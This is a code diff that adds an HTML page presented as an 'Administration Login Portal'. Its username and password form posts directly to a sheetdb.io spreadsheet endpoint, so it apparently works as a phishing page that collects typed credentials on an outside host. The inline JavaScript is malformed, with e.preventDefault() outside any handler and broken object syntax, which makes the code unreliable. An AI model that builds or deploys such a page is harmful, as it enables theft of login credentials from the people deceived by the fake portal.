@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Administration Login Portal</title>
+    <link rel="stylesheet" href="form.css">
+</head>
+<body>
+    <form action="https://sheetdb.io/api/v1/xgahyjel4b66y" method="post" id="sheetdb-form">
+        <div class="imgcontainer">
+          <img src="\admin login pic.png" alt="Administration Login Portal" class="Avatar">
+        </div>
+      
+        <div class="container">
+          <label for="uname"><b>Username</b></label>
+          <input type="text" placeholder="Enter Username" name="data[uname]" required>
+      
+          <label for="psw"><b>Password</b></label>
+          <input type="password" placeholder="Enter Password" name="data[psw]" required>
+      
+          <button type="submit">Login</button>
+          <label>
+            <input type="checkbox" checked="checked" name="remember"> Remember me
+          </label>
+        </div>
+      
+        <div class="container" style="background-color:#f1f1f1">
+          <button type="button" class="cancelbtn">Cancel</button>
+          <span class="psw">Forgot <a href="#">password?</a></span>
+        </div>
+      </form>
+
+      <script>
+
+        var form = document.getElementById('sheetdb-form');
+        
+        e.preventDefault();
+        
+        form.addEventListener("submit", e => { body: new FormData(document.getElementById("sheetdb-form")),
+        
+        fetch(form.action, {
+        
+        method: "POST",
+        
+        }).then(
+        
+        response => response.json()
+        
+        ).then((html) => {
+        
+        // you can put any JS code here window.open(d.h', '_blank');
+         window.open('','_blank');
+        });
+        
+        });
+        
+        </script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
